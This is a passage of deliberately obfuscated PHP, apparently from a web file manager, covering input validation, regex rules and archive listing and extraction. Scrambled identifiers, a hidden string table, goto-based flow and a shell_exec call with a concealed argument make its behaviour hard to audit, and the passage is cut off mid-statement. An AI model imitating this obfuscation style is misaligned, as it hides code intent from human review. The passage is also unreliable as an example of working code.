$e ‰Ÿ©Œ¾¤; } public function fileNameAuto($f°¤ùš‡ŸÚ, $CàˆØªÀ÷Ú, $FŒğ¤²­÷‹ = REPEAT_RENAME, $f›Ä–±±² = false) { $eË–›³¡‡ =& $_SERVER[¿õñ]; $FºŠ¹Õ”Ë = $this->childList($f°¤ùš‡ŸÚ); $fÉğí‘Ó” = array_to_keyvalue($FºŠ¹Õ”Ë, $eË–›³¡‡[33], $eË–›³¡‡[28]); return $this->fileNameAutoGet($fÉğí‘Ó”, $CàˆØªÀ÷Ú, $FŒğ¤²­÷‹, $f›Ä–±±²); } public function fileNameAutoGet($bíª½·œƒ…, $A×¼™íÛö¾, $f¤Ëèƒ¡İß, $Dì†Ş˜•‹í) { $fÙš´á‘Ã =& $_SERVER[¿õñ]; if ($f¤Ëèƒ¡İß == REPEAT_REPLACE || !$bíª½·œƒ… || !in_array_not_case($A×¼™íÛö¾, $bíª½·œƒ…) || $Dì†Ş˜•‹í && $f¤Ëèƒ¡İß != REPEAT_RENAME_FOLDER) { return $A×¼™íÛö¾; } if ($f¤Ëèƒ¡İß == REPEAT_SKIP) { return !1; } $A‹Ùä¸Û¹ì = $fÙš´á‘Ã[92] . get_path_ext($A×¼™íÛö¾); $A‹Ùä¸Û¹ì = $A‹Ùä¸Û¹ì == $fÙš´á‘Ã[92] || $Dì†Ş˜•‹í ? $fÙš´á‘Ã[33] : $A‹Ùä¸Û¹ì; for ($A¿ÎÏÔĞ¿ß = 1; $A¿ÎÏÔĞ¿ß <= count($bíª½·œƒ…) + 1; $A¿ÎÏÔĞ¿ß++) { $EêÛ Â¤—ç = substr($A×¼™íÛö¾, 0, strlen($A×¼™íÛö¾) - strlen($A‹Ùä¸Û¹ì)); $Ešº´İåïÆ = $EêÛ Â¤—ç . "\50{$A¿ÎÏÔĞ¿ß}\x29{$A‹Ùä¸Û¹ì}"; if (!in_array_not_case($Ešº´İåïÆ, $bíª½·œƒ…)) { return $Ešº´İåïÆ; } } } } goto C·¸¶×÷; FÓöšŸ››: if (!function_exists($_SERVER[¿õñ][1783])) { function imagecreatefrombmp($A®ø‘ÈæÛğ) { return ImageGdBMP::load($A®ø‘ÈæÛğ); } } class Input { public static function getArray($f— á„Ê) { goto e¼ÏáÀ¿½; e¼ÏáÀ¿½: $D‚äÛŠ‘ª“ =& $_SERVER[¿õñ]; global $in; $a¼¼¨¨çÒ = array(); goto A’‘ÛÖğòŸ; A’‘ÛÖğòŸ: $AìË©Š‡Œ÷ = array(); $bÅ«é®³¢” = LNG($D‚äÛŠ‘ª“[1784]); foreach ($f— á„Ê as $b‚×â«àÎ  => $dË¢‰ÅÏˆ¸) { goto bÍÆ‹¬¨ö; CÄÕ£Ä¦ƒ: if (isset($dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1788]]) && !self::check($in[$b‚×â«àÎ ], $dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1788]], $aó¾‹Üôª)) { if (array_key_exists($D‚äÛŠ‘ª“[1787], $dË¢‰ÅÏˆ¸)) { if (!is_null($dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1787]])) { $a¼¼¨¨çÒ[$b‡ïÙå­ÒÙ] = $dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1787]]; } } else { $AìË©Š‡Œ÷[] = $b÷ÆàÖÁç; } continue; } $a¼¼¨¨çÒ[$b‡ïÙå­ÒÙ] = $in[$b‚×â«àÎ ]; goto fğ–Ó„ä›; bÍÆ‹¬¨ö: $b÷ÆàÖÁç = _get($dË¢‰ÅÏˆ¸, $D‚äÛŠ‘ª“[1785], $bÅ«é®³¢” . $D‚äÛŠ‘ª“[887] . $b‚×â«àÎ ); $b‡ïÙå­ÒÙ = $b‚×â«àÎ ; if (isset($dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1786]]) && $dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1786]]) { $b‡ïÙå­ÒÙ = $dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1786]]; } goto E¹ñ‡§¯¨; E¹ñ‡§¯¨: if (!array_key_exists($b‚×â«àÎ , $in)) { if (array_key_exists($D‚äÛŠ‘ª“[1787], $dË¢‰ÅÏˆ¸)) { if (!is_null($dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1787]])) { $a¼¼¨¨çÒ[$b‡ïÙå­ÒÙ] = $dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1787]]; } } else { if (isset($dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1788]])) { $AìË©Š‡Œ÷[] = $b÷ÆàÖÁç; } } continue; } if (isset($dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1788]]) && $dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1788]] == $D‚äÛŠ‘ª“[279]) { $Eó³Óéà«ñ = json_decode($in[$b‚×â«àÎ ], !0); if (is_array($Eó³Óéà«ñ)) { $a¼¼¨¨çÒ[$b‡ïÙå­ÒÙ] = $Eó³Óéà«ñ; } else { if (array_key_exists($D‚äÛŠ‘ª“[1787], $dË¢‰ÅÏˆ¸)) { if (!is_null($dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1787]])) { $a¼¼¨¨çÒ[$b‡ïÙå­ÒÙ] = $dË¢‰ÅÏˆ¸[$D‚äÛŠ‘ª“[1787]]; } } else { $AìË©Š‡Œ÷[] = $b÷ÆàÖÁç; } } continue; } $aó¾‹Üôª = _get($dË¢‰ÅÏˆ¸, $D‚äÛŠ‘ª“[995]); goto CÄÕ£Ä¦ƒ; fğ–Ó„ä›: } goto d¶ÚØÒ¬¶; d¶ÚØÒ¬¶: if (count($AìË©Š‡Œ÷) > 0) { show_json(implode($D‚äÛŠ‘ª“[1789], $AìË©Š‡Œ÷), !1); } return $a¼¼¨¨çÒ; goto bá±®ççğ§; bá±®ççğ§: } public static function reg($A´ĞÛ¤¤Ô = "\162\145\x71\165\x69\x72\145") { static $Eå±í×Ö†ä = array("\162\145\161\x75\151\x72\x65" => "\x2e\53", "\156\x75\x6d\x62\145\162" => "\x5c\144\53", "\150\x65\170" => "\133\60\55\x39\x41\x2d\x46\141\55\146\x5d\x2b", "\x69\156\x74" => "\x5b\x2d\134\x2b\x5d\77\x5c\x64\x2b", "\142\x6f\157\154" => "\60\174\61", "\x66\154\157\x61\x74" => "\x5b\55\134\53\135\x3f\134\x64\53\x28\x5c\56\134\144\53\x29\x3f", "\x65\x6e\x67\154\151\x73\150" => "\x5b\x41\x2d\x5a\141\55\x7a\40\135\53", "\143\150\151\156\145\163\x65" => "\133\x5c\x78\x7b\x34\145\60\x30\x7d\55\134\170\173\x39\x66\141\x35\175\135\53", "\150\141\163\103\x68\x69\x6e\145\163\145" => "\57\x28\133\134\x78\173\64\145\60\x30\175\55\x5c\x78\173\x39\x66\141\x35\175\135\53\x29\x2f\x75", "\145\x6d\x61\x69\x6c" => "\134\x77\53\x28\133\x5c\x2e\134\55\x5d\x5c\x77\53\51\52\134\100\x5c\167\53\x28\x5b\x5c\56\134\x2d\x5d\134\167\x2b\x29\x2a\134\x2e\x5c\x77\53", "\x70\150\157\156\x65" => "\61\133\63\55\71\x5d\134\144\173\71\x7d", "\164\x65\x6c\160\x68\x6f\x6e\x65" => "\x28\134\50\134\x64\173\63\x2c\x34\x7d\134\51\174\x5c\x64\173\63\x2c\64\175\x2d\x7c\x5c\x73\51\77\x5c\x64\173\x37\x2c\61\x34\175", "\165\162\x6c" => "\50\x68\164\x74\x70\x7c\x66\164\x70\x7c\150\164\164\x70\x73\x29\72\134\57\x5c\57\x5b\x5c\x77\134\x2d\137\135\53\50\134\56\x5b\134\x77\x5c\x2d\137\135\53\x29\53\50\x5b\x5c\167\x5c\x2d\134\56\x2c\100\x3f\136\x3d\x25\46\x3a\134\x2f\x7e\x5c\53\x23\135\x2a\133\x5c\x77\134\55\x5c\100\77\136\x3d\45\46\x5c\x2f\176\x5c\x2b\x23\x5d\51\77", "\165\x72\x6c\x46\x75\x6c\x6c" => "\x5b\x61\55\172\101\55\172\x5d\53\x3a\134\57\x5c\x2f\x5b\136\x5c\x73\x5d\x2a", "\x69\160" => "\50\x5c\144\173\x31\x2c\63\175\x5c\56\x29\x7b\x33\x7d\50\134\x64\x7b\61\x2c\63\175\x29", "\x7a\x69\x70" => "\133\61\55\71\x5d\134\144\x7b\65\x7d\x28\77\x21\x5c\144\x29", "\151\x64\x43\x61\162\x64" => "\50\134\144\173\x31\65\175\x29\174\x28\134\144\173\x31\67\175\x28\x5c\144\174\x58\x7c\x78\51\x29", "\143\x6f\154\x6f\x72" => "\43\x28\x5b\60\55\x39\101\55\106\x61\x2d\146\135\173\x33\175\x7c\133\60\55\71\101\55\x46\141\x2d\x66\135\x7b\66\x7d\51", "\x74\x69\x6d\x65" => "\50\x5b\x30\55\61\x5d\x5c\144\174\x32\133\60\55\x34\135\51\72\x5b\x30\55\65\x5d\x5c\x64", "\144\141\x74\x65" => "\134\144\173\64\x7d\x5b\x2d\x5c\x2f\135\x3f\x28\x30\x5b\61\55\x39\x5d\174\61\x5b\60\x2d\62\135\x29\133\x2d\x5c\x2f\135\77\x28\x5b\x30\x2d\62\x5d\134\x64\174\x33\133\x30\55\61\135\51", "\x64\141\164\x65\x54\x69\155\x65" => "\x5c\144\x7b\64\175\x5b\x2d\x5c\57\x5d\77\50\60\133\61\x2d\71\135\174\61\x5b\x30\55\62\135\51\x5b\x2d\x5c\57\x5d\77\50\133\x30\x2d\62\135\x5c\144\174\x33\133\60\55\61\x5d\51\134\x73\x2b\50\x5b\x30\55\x31\x5d\134\144\x7c\62\133\x30\55\x34\x5d\51\72\133\x30\55\x35\135\x5c\144", "\x70\141\x73\x73\x77\157\x72\144" => "\x28\x3f\75\x2e\x2a\134\x64\51\x28\x3f\75\x2e\x2a\133\141\x2d\172\x5d\x29\x28\77\75\56\52\133\x41\55\x5a\x5d\x29\56\173\70\x2c\62\60\x7d", "\153\145\171" => "\133\x41\55\x5a\x61\55\x7a\x30\55\71\x5f\x5c\55\x5c\x2e\135\53", "\x6b\x65\x79\x46\x75\154\154" => "\x5b\x41\x2d\x5a\141\x2d\x7a\60\x2d\x39\137\x5c\x2d\x5c\56\134\x73\x2c\135\53"); if (!$A´ĞÛ¤¤Ô) { return $Eå±í×Ö†ä; } return $Eå±í×Ö†ä[$A´ĞÛ¤¤Ô]; } public static function check($c¶¹—Ôóò›, $bÉÂëë²Š˜, $AÚ­çˆ¿¶­ = null) { $BÒŒ»º¨Óö =& $_SERVER[¿õñ]; switch ($bÉÂëë²Š˜) { case $BÒŒ»º¨Óö[7]: return in_array($c¶¹—Ôóò›, $AÚ­çˆ¿¶­); break; case $BÒŒ»º¨Óö[1790]: return floatval($c¶¹—Ôóò›) > $AÚ­çˆ¿¶­; break; case $BÒŒ»º¨Óö[1791]: return floatval($c¶¹—Ôóò›) < $AÚ­çˆ¿¶­; break; case $BÒŒ»º¨Óö[322]: return strlen($c¶¹—Ôóò›) >= $AÚ­çˆ¿¶­[0] && strlen($c¶¹—Ôóò›) <= $AÚ­çˆ¿¶­[1]; break; case $BÒŒ»º¨Óö[322]: if (is_array($AÚ­çˆ¿¶­)) { return strlen($c¶¹—Ôóò›) >= $AÚ­çˆ¿¶­[0] && strlen($c¶¹—Ôóò›) <= $AÚ­çˆ¿¶­[1]; break; } else { return strlen($c¶¹—Ôóò›) == $AÚ­çˆ¿¶­; break; } case $BÒŒ»º¨Óö[318]: return floatval($c¶¹—Ôóò›) >= $AÚ­çˆ¿¶­[0] && floatval($c¶¹—Ôóò›) <= $AÚ­çˆ¿¶­[1]; break; } $FÂÀò•³«ì = self::reg(!1); $bÉÂëë²Š˜ = isset($FÂÀò•³«ì[$bÉÂëë²Š˜]) ? $FÂÀò•³«ì[$bÉÂëë²Š˜] : $bÉÂëë²Š˜; if (substr($bÉÂëë²Š˜, 0, 1) != $BÒŒ»º¨Óö[8]) { $bÉÂëë²Š˜ = $BÒŒ»º¨Óö[1792] . $bÉÂëë²Š˜ . $BÒŒ»º¨Óö[1793]; } return preg_match($bÉÂëë²Š˜, $c¶¹—Ôóò›) === 1; } public static function get($bõˆä…¤ÀÓ, $aœ°’÷‡× = null, $BÁ†ÎŒ¹¾ = null, $f§ØéŒ¶Ø = null) { goto AÌ¦„Üñâ; a•ÒƒçõŠ: if (!is_null($f§ØéŒ¶Ø)) { $b¹ê¨àç—Ÿ[$EµÓÈ‹Ë[995]] = $f§ØéŒ¶Ø; } if (!is_null($aœ°’÷‡×)) { $b¹ê¨àç—Ÿ[$EµÓÈ‹Ë[1788]] = $aœ°’÷‡×; } $DÕ½š°‚¦· = Input::getArray(array($bõˆä…¤ÀÓ => $b¹ê¨àç—Ÿ)); goto E·É¢©íîö; AÌ¦„Üñâ: $EµÓÈ‹Ë =& $_SERVER[¿õñ]; $b¹ê¨àç—Ÿ = array(); if (!is_null($BÁ†ÎŒ¹¾)) { $b¹ê¨àç—Ÿ[$EµÓÈ‹Ë[34]] = $BÁ†ÎŒ¹¾; } goto a•ÒƒçõŠ; E·É¢©íîö: return $DÕ½š°‚¦·[$bõˆä…¤ÀÓ]; goto b·–ŠæàÖ; b·–ŠæàÖ: } } class KodArchive { static function init() { goto e–¬ô«‹ãò; e–¬ô«‹ãò: $E™÷±Ñ…§ö =& $_SERVER[¿õñ]; if (defined($E™÷±Ñ…§ö[1794])) { return; } define($E™÷±Ñ…§ö[1794], SDK_DIR . $E™÷±Ñ…§ö[1795]); goto f’èÀ¸ø¸; AíÒƒÕª™‰: require_once ARCHIVE_LIB . $E™÷±Ñ…§ö[1802]; require_once ARCHIVE_LIB . $E™÷±Ñ…§ö[1803]; require_once ARCHIVE_LIB . $E™÷±Ñ…§ö[1804]; goto B¶ç¹¼í²; f’èÀ¸ø¸: define($E™÷±Ñ…§ö[1796], TEMP_FILES); define($E™÷±Ñ…§ö[1797], TEMP_FILES); define($E™÷±Ñ…§ö[1798], $E™÷±Ñ…§ö[1799]); goto AòŠ’ò¾‘‘; AòŠ’ò¾‘‘: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $E™÷±Ñ…§ö[1800]; require_once ARCHIVE_LIB . $E™÷±Ñ…§ö[1801]; goto AíÒƒÕª™‰; B¶ç¹¼í²: require_once ARCHIVE_LIB . $E™÷±Ñ…§ö[1805]; goto A©ÍåÔ‹Æ; A©ÍåÔ‹Æ: } static function checkIfType($F®’Èâ±Öê, $fõ»ù¹“ªš) { goto bÔİ“•¼æÜ; bÔİ“•¼æÜ: $C¥“Î‹…¨ =& $_SERVER[¿õñ]; self::init(); $B›…Ã­´”± = array($C¥“Î‹…¨[298] => array($C¥“Î‹…¨[298], $C¥“Î‹…¨[1806], $C¥“Î‹…¨[1807], $C¥“Î‹…¨[1808]), $C¥“Î‹…¨[1809] => array($C¥“Î‹…¨[1809], $C¥“Î‹…¨[1810], $C¥“Î‹…¨[1811], $C¥“Î‹…¨[1812]), $C¥“Î‹…¨[1029] => array($C¥“Î‹…¨[1029], $C¥“Î‹…¨[1813], $C¥“Î‹…¨[1814], $C¥“Î‹…¨[1815], $C¥“Î‹…¨[1816], $C¥“Î‹…¨[1817], $C¥“Î‹…¨[1818])); goto EË¡ºÎ¬¦; EË¡ºÎ¬¦: $bÖÓ±ÂˆÎÄ = in_array($F®’Èâ±Öê, $B›…Ã­´”±[$fõ»ù¹“ªš]); if ($bÖÓ±ÂˆÎÄ && ($fõ»ù¹“ªš == $C¥“Î‹…¨[298] || $fõ»ù¹“ªš == $C¥“Î‹…¨[1809]) && (!function_exists($C¥“Î‹…¨[1819]) || !function_exists($C¥“Î‹…¨[1820]))) { show_tips($C¥“Î‹…¨[1821]); } if ($bÖÓ±ÂˆÎÄ && $fõ»ù¹“ªš == $C¥“Î‹…¨[1029] && (!function_exists($C¥“Î‹…¨[1822]) || !strstr(shell_exec($C¥“Î‹…¨[1823]), $C¥“Î‹…¨[1824]))) { show_tips($C¥“Î‹…¨[1825]); } goto f²ßÔ¥Í³¡; f²ßÔ¥Í³¡: return $bÖÓ±ÂˆÎÄ; goto a³¶†š¥ˆ¾; a³¶†š¥ˆ¾: } static function listContent($AÕ¸¦ÆæÅ, $BÁåãŒÁ¦ñ = true) { $AÛ¹ñ–èã =& $_SERVER[¿õñ]; self::init(); $e–…©¾™’Ä = $GLOBALS[$AÛ¹ñ–èã[1030]] ? $GLOBALS[$AÛ¹ñ–èã[1030]] : get_path_ext($AÕ¸¦ÆæÅ); $EŒ‰‰ÅËÓ¶ = !1; if (self::checkIfType($e–…©¾™’Ä, $AÛ¹ñ–èã[1809])) { $a¸š™ßî = PclTarList($AÕ¸¦ÆæÅ, $e–…©¾™’Ä); $EŒ‰‰ÅËÓ¶ = array(); for ($EÎÔ…ª†‰ = 0; $EÎÔ…ª†‰ < count($a¸š™ßî); $EÎÔ…ª†‰++) { $B¶¸‹ç”ô = $a¸š™ßî[$EÎÔ…ª†‰]; if ($B¶¸‹ç”ô[$AÛ¹ñ–èã[1826]] == $AÛ¹ñ–èã[1827] || $B¶¸‹ç”ô[$AÛ¹ñ–èã[1826]] == $AÛ¹ñ–èã[1828]) { continue; } if ($BÁåãŒÁ¦ñ) { $B¶¸‹ç”ô[$AÛ¹ñ–èã[1829]] = ltrim($B¶¸‹ç”ô[$AÛ¹ñ–èã[1829]], $AÛ¹ñ–èã[1123]); } if ($B¶¸‹ç”ô[$AÛ¹ñ–èã[1826]] == $AÛ¹ñ–èã[1830]) { $B¶¸‹ç”ô[$AÛ¹ñ–èã[77]] = !0; } else { $B¶¸‹ç”ô[$AÛ¹ñ–èã[77]] = !1; } $B¶¸‹ç”ô[$AÛ¹ñ–èã[1021]] = $EÎÔ…ª†‰; $EŒ‰‰ÅËÓ¶[] = $B¶¸‹ç”ô; } } else { if (self::checkIfType($e–…©¾™’Ä, $AÛ¹ñ–èã[1029])) { $CÁô–‚ÉÅ = kodRarArchive::listContent($AÕ¸¦ÆæÅ); if (!$CÁô–‚ÉÅ[$AÛ¹ñ–èã[1017]]) { return $CÁô–‚ÉÅ; } else { $EŒ‰‰ÅËÓ¶ = $CÁô–‚ÉÅ[$AÛ¹ñ–èã[1019]]; } } else { if (kodZipArchive::support($AÛ¹ñ–èã[350])) { $EŒ‰‰ÅËÓ¶ = kodZipArchive::listContent($AÕ¸¦ÆæÅ); } else { $A®ùŠ‘°¿ = new PclZip($AÕ¸¦ÆæÅ); $EŒ‰‰ÅËÓ¶ = $A®ùŠ‘°¿->listContent(); } } } if ($EŒ‰‰ÅËÓ¶) { $c¨ÅÅØ¢Í¼ = unzip_charset_get($EŒ‰‰ÅËÓ¶); $BÁåãŒÁ¦ñ = $BÁåãŒÁ¦ñ && function_exists($AÛ¹ñ–èã[66]); for ($EÎÔ…ª†‰ = 0; $EÎÔ…ª†‰ < count($EŒ‰‰ÅËÓ¶); $EÎÔ…ª†‰++) { $EŒ‰‰ÅËÓ¶[$EÎÔ…ª†‰][$AÛ¹ñ–èã[1829]] = str_replace(array($AÛ¹ñ–èã[1052], $AÛ¹ñ–èã[1831]), $AÛ¹ñ–èã[768], $EŒ‰‰ÅËÓ¶[$EÎÔ…ª†‰][$AÛ¹ñ–èã[1829]]); if ($BÁåãŒÁ¦ñ) { $EŒ‰‰ÅËÓ¶[$EÎÔ…ª†‰][$AÛ¹ñ–èã[1829]] = iconv_to($EŒ‰‰ÅËÓ¶[$EÎÔ…ª†‰][$AÛ¹ñ–èã[1829]], $c¨ÅÅØ¢Í¼, $AÛ¹ñ–èã[323]); unset($EŒ‰‰ÅËÓ¶[$EÎÔ…ª†‰][$AÛ¹ñ–èã[1832]]); } } return array($AÛ¹ñ–èã[1017] => !0, $AÛ¹ñ–èã[1019] => $EŒ‰‰ÅËÓ¶); } else { return array($AÛ¹ñ–èã[1017] => !1, $AÛ¹ñ–èã[1019] => $EŒ‰‰ÅËÓ¶); } } static function extract($D¾ã«£¼÷Î, $c¿Õƒ§„•Ì, $Eò’ñ‹Âó = "\x2d\61", &$FŒÓ° ÄŒÔ = false) { goto BóíÊ²šŠ; BóíÊ²šŠ: $Bœì¨ğÓÃÜ =& $_SERVER[¿õñ]; self::init(); $b¸ÉÄÂ¡î‹ = $GLOBALS[$Bœì¨ğÓÃÜ[1030]] ? $GLOBALS[$Bœì¨ğÓÃÜ[1030]] : get_path_ext($D¾ã«£¼÷Î); goto Có±’Ùéçˆ; Có±’Ùéçˆ: $c†ŠôäŞË¹ = self::listContent($D¾ã«£¼÷Î, !1); if (!$c†ŠôäŞË¹[$Bœì¨ğÓÃÜ[1017]]) { return $c†ŠôäŞË¹; } if ($Eò’ñ‹Âó != $Bœì¨ğÓÃÜ[1016]) { goto Eç™ĞË½æÔ; E†àäÊêİ: if ($GLOBALS[$Bœì¨ğÓÃÜ[6]][$Bœì¨ğÓÃÜ[1121]] != $Bœì¨ğÓÃÜ[323]) { $A«£ÑéÓ¥Ÿ = unzip_pre_name($FŒÓ° ÄŒÔ); } $F¶…ÈÕÂ«® = get_path_father($FŒÓ° ÄŒÔ); if ($F¶…ÈÕÂ«® == $FŒÓ° ÄŒÔ) { $F¶…ÈÕÂ«® = $Bœì¨ğÓÃÜ[33]; } goto b±å°ò; b±å°ò: if ($CË÷ÌÔØ‰…[$Bœì¨ğÓÃÜ[77]]) { $A«£ÑéÓ¥Ÿ = rtrim($A«£ÑéÓ¥Ÿ, $Bœì¨ğÓÃÜ[8]) . $Bœì¨ğÓÃÜ[8]; $FŒÓ° ÄŒÔ = array($FŒÓ° ÄŒÔ); } $fÛšóÇ×·„ = str_replace($Bœì¨ğÓÃÜ[94], $Bœì¨ğÓÃÜ[8], $A«£ÑéÓ¥Ÿ); if (substr($fÛšóÇ×·„, -1) == $Bœì¨ğÓÃÜ[8]) { if (!strstr(trim($fÛšóÇ×·„, $Bœì¨ğÓÃÜ[8]), $Bœì¨ğÓÃÜ[8])) { $c¿Õƒ§„•Ì = $c¿Õƒ§„•Ì . get_path_this($fÛšóÇ×·„) . $Bœì¨ğÓÃÜ[8]; } } else { if ($F¶…ÈÕÂ«® == $A«£ÑéÓ¥Ÿ) { $F¶…ÈÕÂ«® = $Bœì¨ğÓÃÜ[33]; } } goto E¹÷Å¢æ°; Eç™ĞË½æÔ: $CË÷ÌÔØ‰… = self::fileIndex($c†ŠôäŞË¹[$Bœì¨ğÓÃÜ[1019]], $Eò’ñ‹Âó); $FŒÓ° ÄŒÔ = str_replace(array($Bœì¨ğÓÃÜ[1052], $Bœì¨ğÓÃÜ[1831]), $Bœì¨ğÓÃÜ[71], $CË÷ÌÔØ‰…[$Bœì¨ğÓÃÜ[1829]]); $A«£ÑéÓ¥Ÿ = $FŒÓ° ÄŒÔ; goto E†àäÊêİ; E¹÷Å¢æ°: } goto Cª•’’ø; Cª•’’ø: if (self::checkIfType($b¸ÉÄÂ¡î‹, $Bœì¨ğÓÃÜ[1809])) { if ($Eò’ñ‹Âó != $Bœì¨ğÓÃÜ[1016]) { $A«£ÑéÓ¥Ÿ = unzip_pre_name($A«£ÑéÓ¥Ÿ); $F¶…ÈÕÂ«® = unzip_pre_name($F¶…ÈÕÂ«®); $cÒÒß…ÕÛ¤ = PclTarExtractList($D¾ã«£¼÷Î, array($A«£ÑéÓ¥Ÿ), $c¿Õƒ§„•Ì, $F¶…ÈÕÂ«®, $b¸ÉÄÂ¡î‹); } else { $cÒÒß…ÕÛ¤ = PclTarExtract($D¾ã«£¼÷Î, $c¿Õƒ§„•Ì, $Bœì¨ğÓÃÜ[358], $b¸ÉÄÂ¡î‹); } return array($Bœì¨ğÓÃÜ[1017] => $cÒÒß…ÕÛ¤, $Bœì¨ğÓÃÜ[1019] => PclErrorString(!0)); } else { if (self::checkIfType($b¸ÉÄÂ¡î‹, $Bœì¨ğÓÃÜ[1029])) { return kodRarArchive::extract($D¾ã«£¼÷Î, $c¿Õƒ§„•Ì, $b¸ÉÄÂ¡î‹, $FŒÓ° ÄŒÔ); } else { if (kodZipArchive::support($Bœì¨ğÓÃÜ[1833])) { return kodZipArchive::extract($D¾ã«£¼÷Î, $c¿Õƒ§„•Ì, $FŒÓ° ÄŒÔ); } else { $e¢ÓŒì“‰ğ = new PclZip($D¾ã«£¼÷Î); if ($Eò’ñ‹Âó != $Bœì¨ğÓÃÜ[1016]) { $cÒÒß…ÕÛ¤ = $e¢ÓŒì“‰ğ->extract(PCLZIP_OPT_PATH, $c¿Õƒ§„•Ì, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Bœì¨ğÓÃÜ[1834], PCLZIP_OPT_BY_NAME, $CË÷ÌÔØ‰…[$Bœì¨ğÓÃÜ[1829]], PCLZIP_OPT_REMOVE_PATH, $F¶…ÈÕÂ«®, PCLZIP_OPT_REPLACE_NEWER); } else { $cÒÒß…ÕÛ¤ = $e¢ÓŒì“‰ğ->extract(PCLZIP_OPT_PATH, $c¿Õƒ§„•Ì, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Bœì¨ğÓÃÜ[1834], PCLZIP_OPT_REPLACE_NEWER); } return array($Bœì¨ğÓÃÜ[1017] => $cÒÒß…ÕÛ¤, $Bœì¨ğÓÃÜ[1019] => $e¢ÓŒì“‰ğ->errorName(!0)); } } } return array($Bœì¨ğÓÃÜ[1017] => !1, $Bœì¨ğÓÃÜ[1019] => $Bœì¨ğÓÃÜ[1835]); goto a‰æø¡³¢í; a‰æø¡³¢í: } static function fileIndex($AÈóÑñ•Š’, $cˆÄˆ·„Ú„, $fâà¬Æ°‡Ä = false) { goto FƒÈ·ÜÚ÷; DÈ´ˆ‚£›÷: $F…‹¢¯…Ö¨ = $eŠÎÁÈì‰²; if ($fâà¬Æ°‡Ä) { $F…‹¢¯…Ö¨ = $eŠÎÁÈì‰²[$fâà¬Æ°‡Ä]; if ($eŠÎÁÈì‰²[$A×’×Ûé½Ü[77]]) { $F…‹¢¯…Ö¨ = rtrim($F…‹¢¯…Ö¨, $A×’×Ûé½Ü[8]) . $A×’×Ûé½Ü[8]; } } return $F…‹¢¯…Ö¨; goto a£Ò¥¸†£ğ; FƒÈ·ÜÚ÷: $A×’×Ûé½Ü =& $_SERVER[¿õñ]; self::init(); if (!is_array($AÈóÑñ•Š’)) { return !1; } goto AÛ‰­‡¿ÎÊ; AÛ‰­‡¿ÎÊ: $BóŠë‹òˆ = count($AÈóÑñ•Š’); for ($F–Ûš‡¬¸ = 0; $F–Ûš‡¬¸ < $BóŠë‹òˆ; $F–Ûš‡¬¸++) { if ($cˆÄˆ·„Ú„ == $AÈóÑñ•Š’[$F–Ûš‡¬¸][$A×’×Ûé½Ü[1021]]) { $eŠÎÁÈì‰² = $AÈóÑñ•Š’[$F–Ûš‡¬¸]; break; } } if (!$eŠÎÁÈì‰²) { show_tips($A×’×Ûé½Ü[1836]); } goto DÈ´ˆ‚£›÷; a£Ò¥¸†£ğ: } static function extractZipFile($b­Á‘÷ÇÜ¾, $Aâ½¤ø¿Ë³, $Fä†Œê ± = false) { goto côÜÙòÒ ‘; dç‡†ÁõÁ: $Bàµ¥®¯Ñ = get_path_father($Aâ½¤ø¿Ë³); if ($Bàµ¥®¯Ñ == $Aâ½¤ø¿Ë³) { $Bàµ¥®¯Ñ = $d¶¦âÙÌ¹[33]; } $bŞ¥´Ÿ‘Üó = $eÚêÀ‰®îö->extract(PCLZIP_OPT_PATH, $Dëã­˜¥ÈÀ, PCLZIP_CB_PRE_FILE_NAME, $d¶¦âÙÌ¹[1834], PCLZIP_OPT_REMOVE_PATH, $Bàµ¥®¯Ñ, PCLZIP_OPT_BY_NAME, $Aâ½¤ø¿Ë³); goto AÃµÃ¶ù†ì; AÚŒØš— ¨: if (file_exists($Fåç¼éçØ‚)) { return $Fåç¼éçØ‚; } $eÚêÀ‰®îö = new PclZip($b­Á‘÷ÇÜ¾); $F¢±©Ñ­¸Ã = unzip_filter_ext($Dëã­˜¥ÈÀ . get_path_this($Aâ½¤ø¿Ë³)); goto dç‡†ÁõÁ; cÆ±ˆÜœÉ‰: mk_dir($Dëã­˜¥ÈÀ); $Fåç¼éçØ‚ = $Dëã­˜¥ÈÀ . md5($b­Á‘÷ÇÜ¾ . $Aâ½¤ø¿Ë³); if ($Fä†Œê ±) { $Fåç¼éçØ‚ = $Dëã­˜¥ÈÀ . $Fä†Œê ±; } goto AÚŒØš— ¨; AÃµÃ¶ù†ì: if (!file_exists($F¢±©Ñ­¸Ã)) { return !1; } @rename($F¢±©Ñ­¸Ã, $Fåç¼éçØ‚); return $Fåç¼éçØ‚; goto E³­° ëÈ; côÜÙòÒ ‘: $d¶¦âÙÌ¹ =& $_SERVER[¿õñ]; self::init(); $Dëã­˜¥ÈÀ = TEMP_FILES . hash_path($b­Á‘÷ÇÜ¾) . $d¶¦âÙÌ¹[8]; goto cÆ±ˆÜœÉ‰; E³­° ëÈ: } static function filePreview($f›–ÁŒ†¬¾, $eÚÒ›¹¡í, $cŸœÊŠ¢• = false, $CÄÈÚØœí = false) { goto b’Š¡¿›‰; Eõ¥öÇ¶Ñ¾: mk_dir($aô§™ØÓéÖ); $fªÛÁõÇ– = $aô§™ØÓéÖ . md5($f›–ÁŒ†¬¾ . $eÚÒ›¹¡í . $CÄÈÚØœí); $c˜¢Ú°†èê = $fİ‡×ÊÔ…[33]; goto d’ô«‰ º; cĞ† Ë¡ì: $c˜¢Ú°†èê = unzip_pre_name($c˜¢Ú°†èê); $eËõƒÙ´å‚ = get_path_this($c˜¢Ú°†èê); $A©äµ™ßŠ» = unzip_filter_ext($aô§™ØÓéÖ . 